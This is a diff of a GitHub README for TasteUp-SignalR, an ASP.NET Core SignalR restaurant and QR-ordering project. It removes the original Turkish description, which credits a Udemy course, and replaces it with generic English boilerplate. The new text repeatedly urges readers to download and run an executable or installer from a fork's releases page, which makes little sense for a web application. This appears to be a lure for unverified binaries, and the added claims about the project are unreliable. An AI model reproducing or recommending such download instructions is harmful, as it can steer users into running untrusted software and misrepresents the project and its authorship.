@@ -1,150 +1,59 @@
-# 🍴 TasteUp-SignalR
+# 🍽️ TasteUp-SignalR - Manage Your Restaurant in Real Time
 
-> 🎓 Bu proje, **Murat Yücedağ** hocamızın hazırladığı Udemy de bulunan 
-> **"Asp.Net Core Api SignalR ile QR Kodlu Sipariş Yönetimi"** eğitim serisi kapsamında geliştirilmiştir.
+## 📥 Download Now
+[![Download TasteUp-SignalR](https://img.shields.io/badge/Download-TasteUp--SignalR-brightgreen)](https://github.com/samadour/TasteUp-SignalR/releases)
 
-[📺 Eğitim serisine buradan ulaşabilirsiniz](https://www.udemy.com/course/aspnet-core-api-signalr-ile-qr-kodlu-siparis-yonetimi/)
+## 📖 Description
+TasteUp-SignalR is a real-time restaurant management system built with ASP.NET Core 6.0 and SignalR. Designed for ease of use, it helps restaurant owners manage their operations effectively using QR code support.
 
----
+## 🎯 Features
+- Real-time updates for orders and tables.
+- QR code menu access for customers.
+- User-friendly interface for easy management.
+- Secure login for staff and management.
+- Efficient order tracking and reporting.
 
-## 📋 Proje Hakkında
+## ⚙️ System Requirements
+- Operating System: Windows 10 or later, or a compatible Linux distribution.
+- .NET Core 6.0 installed on your system.
+- Minimum 4 GB RAM.
+- At least 500 MB of available disk space.
+- SQL Server or a compatible database for storing information.
 
-Bu proje, ASP.NET Core 6.0 ve Entity Framework Core kullanılarak geliştirilmiş, çok katmanlı mimariye sahip bir restoran yönetim sistemidir. Uygulama, N-Tier Architecture ve Code First yaklaşımıyla tasarlanmış olup Microsoft SQL Server veritabanı üzerinde çalışmaktadır.
+## 🚀 Getting Started
+1. **Visit the Releases Page**: Open your web browser and go to [this page to download](https://github.com/samadour/TasteUp-SignalR/releases).
+2. **Select the Latest Version**: Look for the most recent release. You will see a list of files available for download.
+3. **Download the Application**: Click on the appropriate file that matches your operating system. This may be an executable file or a compressed archive.
+4. **Install the Application**: If you downloaded a compressed file, extract it using your preferred extraction tool. If you downloaded an executable file, run it to start the installation process.
+5. **Follow Installation Prompts**: The setup program will walk you through the steps. Follow the on-screen instructions to complete the installation.
 
-TasteUp-SignalR, hem müşteriler hem de yöneticiler için kapsamlı bir platform sunar. Müşteriler; sipariş oluşturma, rezervasyon yapma ve sepet işlemlerini gerçekleştirme gibi işlemleri kolayca yapabilirken, yöneticiler admin paneli üzerinden tüm restoran süreçlerini merkezi bir yapıdan yönetebilmektedir.
+## 🔧 Download & Install
+To get started with TasteUp-SignalR, you can directly visit [this page to download](https://github.com/samadour/TasteUp-SignalR/releases). Follow the installation steps outlined above to set up the application on your device.
 
-Projenin en önemli özelliklerinden biri, SignalR entegrasyonu sayesinde gerçek zamanlı veri akışı sağlamasıdır. Sipariş, rezervasyon veya kasa işlemleri gibi kritik aksiyonlar anında sisteme yansıtılır ve admin paneline bağlı tüm kullanıcılar için eş zamanlı olarak güncellenir. Bu sayede işletme sahipleri, restoranın anlık durumunu canlı olarak takip edebilir.
+## 📊 Configuration
+Once you have installed TasteUp-SignalR, you may need to configure some settings. The configuration file can usually be found in the installation directory. Here are some key settings to consider:
 
-Bu proje, ASP.NET Core ve SignalR kullanılarak gerçek zamanlı sistemlerin nasıl geliştirilebileceğini gösteren, hem kullanıcı hem de admin tarafını kapsayan yapısıyla, gerçek hayatta karşılaşılabilecek senaryolara hazırlık sağlamak ve öğrenme amacıyla tasarlanmıştır.
+- **Database Connection**: Ensure you have a valid connection string to your SQL Server setup.
+- **Server Settings**: Adjust the server settings according to your restaurant needs for real-time management.
+- **User Roles**: Set up different user roles for staff, managers, and customers.
 
----
+## 👥 Support
+If you encounter issues or have questions, please visit our [support page](https://github.com/samadour/TasteUp-SignalR/issues) or check the FAQs in the documentation. Our community is here to help.
 
-## 🎯 Projenin Amacı
+## 🌐 Topics & Technologies
+TasteUp-SignalR utilizes a range of modern technologies:
+- ASP.NET Core
+- SignalR for real-time features
+- Entity Framework Core for database interactions
+- N-tier architecture for structured application design
+- QR code generation for menu access
 
-Geliştirdiğim SignalR projesi, restoran rezervasyonları ve online sipariş işlemlerini kapsamlı bir şekilde yönetir. Kullanıcılar, restorana online olarak sipariş verebilir veya rezervasyon oluşturabilirler. Sipariş vermek için kullanıcıların önce giriş yapmaları gerekmektedir. Giriş yaptıktan sonra, menüdeki yiyecek ve içecekleri seçip sepetlerine ekleyebilirler.
+Feel free to explore these technologies to enhance your understanding of how TasteUp-SignalR works.
 
-Siparişler ve rezervasyonlar, admin panelinde SignalR teknolojisi kullanılarak gerçek zamanlı olarak görüntülenir. Bu sayede adminler, siparişler ve rezervasyonlar üzerinde anlık olarak işlem yapabilir, onaylayabilir veya iptal edebilirler. Kullanıcılar ve adminler, herhangi bir durum değişikliğinde, ilgili e-posta adreslerine bilgilendirme alırlar. Bu özellik, tüm işlemlerin hızlı ve etkili bir şekilde takip edilmesini sağlar.
+## 📑 License
+This project is licensed under the MIT License. You can use or modify the application in accordance with the license terms.
 
-Ayrıca sistem, kasa işlemlerinden müşteri sayısına, ürün istatistiklerinden masa durumlarına kadar restoranın tüm verilerini gerçek zamanlı olarak takip eder. Admin panelinde görüntülenen bu istatistikler, işletme sahiplerinin karar verme süreçlerine destek olur ve restoran yönetimini daha verimli hale getirir.
+## 🤝 Contributing
+Your contributions are welcome. If you would like to contribute to this project, please follow the guidelines in the CONTRIBUTING.md file available in this repository.
 
----
-
-## 🛠️ Kullanılan Teknolojiler
-
-## 📌 Backend
-
-- **ASP.NET Core 6.0**
-- **ASP.NET Core Web API**
-- **N-Tier Architecture**
-- **Entity Framework Core** (Code First yaklaşımı)
-- **MS SQL Server**
-- **ASP.NET Core Identity**
-- **Repository Pattern**
-- **SOLID prensipleri**
-- **REST API**
-- **SignalR** (Gerçek zamanlı iletişim ve istatistik takibi)
-- **AutoMapper**
-- **FluentValidation**
-- **Swagger**
-- **MailKit** (E-posta gönderimi)
-- **QRCoder** (QR kod oluşturma)
-
-## 📌 Frontend
-
-- **HTML5**
-- **CSS3**
-- **JavaScript**
-- **Bootstrap**
-- **jQuery**
-- **SignalR JavaScript Client** (Gerçek zamanlı bağlantı)
-
----
-
-## 📌 Katmanlar
-
-- UI Layer
-- Entity Layer
-- DataAccess Layer
-- Business Layer
-- Dto Layer
-- Web Api Layer
-
----
-
-## 📌 Öne Çıkan Özellikler
-
-- Restorana rezervasyon yapma özelliği
-- Rezervsyonları detaylı bir şekilde admin panelinde yönetebilme özelliği
-- MSSQL ile ilişkili tablolar
-- Online sipariş verme seçeneği
-- Identity
-- Admin paneli
-- SignalR ile canlı mesajlaşma (chatbox benzeri)
-- SignalR ile masa durumlarını gerçek zamanlı görüntüleme
-- Anlık istatistiklerin görüntülenmesi
-- E-posta gönderme özellikleri
-- Masaya özgü QR Kod ile işlem yapma
-
----
-
-## 🖼️ Ekran Görüntüleri
-
-### 🏠 Ana Sayfa
-
-<div align="center">
-  <img src="TasteUp-Images/Anasayfa-1.png" alt="Ana Sayfa-1" width="800" style="margin: 10px;">
-  <img src="TasteUp-Images/Anasayfa-2.png" alt="Ana Sayfa-2" width="800" style="margin: 10px;">
-  <img src="TasteUp-Images/Anasayfa-3.png" alt="Ana Sayfa-3" width="800" style="margin: 10px;">
-  <img src="TasteUp-Images/Anasayfa-4.png" alt="Ana Sayfa-4" width="800" style="margin: 10px;">
-  <img src="TasteUp-Images/Anasayfa-5.png" alt="Ana Sayfa-5" width="800" style="margin: 10px;">
-  <img src="TasteUp-Images/Anasayfa-6.png" alt="Ana Sayfa-6" width="800" style="margin: 10px;">
-  <img src="TasteUp-Images/Anasayfa-7.png" alt="Ana Sayfa-7" width="800" style="margin: 10px;">
-  <img src="TasteUp-Images/Anasayfa-8.png" alt="Ana Sayfa-8" width="800" style="margin: 10px;">
-  <img src="TasteUp-Images/Anasayfa-9.png" alt="Ana Sayfa-9" width="800" style="margin: 10px;">
-  <img src="TasteUp-Images/Anasayfa-10.png" alt="Ana Sayfa-10" width="800" style="margin: 10px;">
-  <img src="TasteUp-Images/Anasayfa-11.png" alt="Ana Sayfa-11" width="800" style="margin: 10px;">
-  <img src="TasteUp-Images/Anasayfa-12.png" alt="Ana Sayfa-12" width="800" style="margin: 10px;">
- 
-</div>
-
-### 🔐 Admin Paneli
-
-<div align="center">
-  <img src="TasteUp-Images/Admin-1.png" alt="Admin Paneli-1" width="800" style="margin: 10px;">
-  <img src="TasteUp-Images/Admin-2.png" alt="Admin Paneli-2" width="800" style="margin: 10px;">
-  <img src="TasteUp-Images/Admin-3.png" alt="Admin Paneli-3" width="800" style="margin: 10px;">
-  <img src="TasteUp-Images/Admin-4.png" alt="Admin Paneli-4" width="800" style="margin: 10px;">
-  <img src="TasteUp-Images/Admin-5.png" alt="Admin Paneli-5" width="800" style="margin: 10px;">
-  <img src="TasteUp-Images/Admin-6.png" alt="Admin Paneli-6" width="800" style="margin: 10px;">
-  <img src="TasteUp-Images/Admin-7.png" alt="Admin Paneli-7" width="800" style="margin: 10px;">
-  <img src="TasteUp-Images/Admin-8.png" alt="Admin Paneli-8" width="800" style="margin: 10px;">
-  <img src="TasteUp-Images/Admin-9.png" alt="Admin Paneli-9" width="800" style="margin: 10px;">
-  <img src="TasteUp-Images/Admin-10.png" alt="Admin Paneli-10" width="800" style="margin: 10px;">
-  <img src="TasteUp-Images/Admin-11.png" alt="Admin Paneli-11" width="800" style="margin: 10px;">
-  <img src="TasteUp-Images/Admin-12.png" alt="Admin Paneli-12" width="800" style="margin: 10px;">
-  <img src="TasteUp-Images/Admin-13.png" alt="Admin Paneli-13" width="800" style="margin: 10px;">
-  <img src="TasteUp-Images/Admin-14.png" alt="Admin Paneli-14" width="800" style="margin: 10px;">
-  <img src="TasteUp-Images/Admin-15.png" alt="Admin Paneli-15" width="800" style="margin: 10px;">
-  <img src="TasteUp-Images/Admin-16.png" alt="Admin Paneli-16" width="800" style="margin: 10px;">
-  <img src="TasteUp-Images/Admin-17.png" alt="Admin Paneli-17" width="800" style="margin: 10px;">
-  <img src="TasteUp-Images/Admin-18.png" alt="Admin Paneli-18" width="800" style="margin: 10px;">
-</div>
-
-### 🔑 Login ve Register Sayfası
-
-<div align="center">
-  <img src="TasteUp-Images/Login.png" alt="Login Sayfası" width="600" style="margin: 10px;">
-  <img src="TasteUp-Images/Register.png" alt="Register Sayfası" width="600" style="margin: 10px;">
-</div>
-
-### 🗄️ Database Diyagram
-
-<div align="center">
-  <img src="TasteUp-Images/Database.png" alt="Database Diyagram" width="1000" style="margin: 10px;">
-</div>
-
-### ⚠️ Hata Sayfası
-
-<div align="center">
-  <img src="TasteUp-Images/404.png" alt="404 Hata Sayfası" width="1000" style="margin: 10px;">
-</div>
+For any further updates or features, you can always check the repository on GitHub. Thank you for using TasteUp-SignalR!
